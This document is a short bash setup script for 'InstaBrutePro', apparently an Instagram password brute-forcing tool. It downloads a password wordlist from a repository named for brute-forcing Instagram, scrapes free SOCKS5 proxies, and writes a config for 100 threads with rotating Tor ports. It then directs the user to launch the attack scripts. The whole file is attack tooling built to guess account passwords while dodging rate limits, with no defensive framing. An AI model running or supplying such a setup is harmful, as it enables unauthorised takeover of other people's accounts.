#!/bin/bash
echo "Setting up InstaBrutePro..."
pkg update -y && pkg install tor python curl openssl -y
pip install -r requirements.txt
mkdir -p wordlists proxies config hits
# Download sample wordlist (10M subset for demo)
curl -L -o wordlists/rockyou_sample.txt https://raw.githubusercontent.com/0xfff0800/Brute-force-Instagram-2025/master/wordlist.txt  # Or full rockyou
# Fetch proxies
curl -s https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all > proxies/free_proxies.txt
# Config
cat > config/instabrute_config.json << EOF
{"threads": 100, "delay": 0.1, "tor_ports": [9050,9052,9054,9056,9058]}
EOF
chmod +x multitor.sh
echo "Setup complete! Run ./multitor.sh then python brute.py"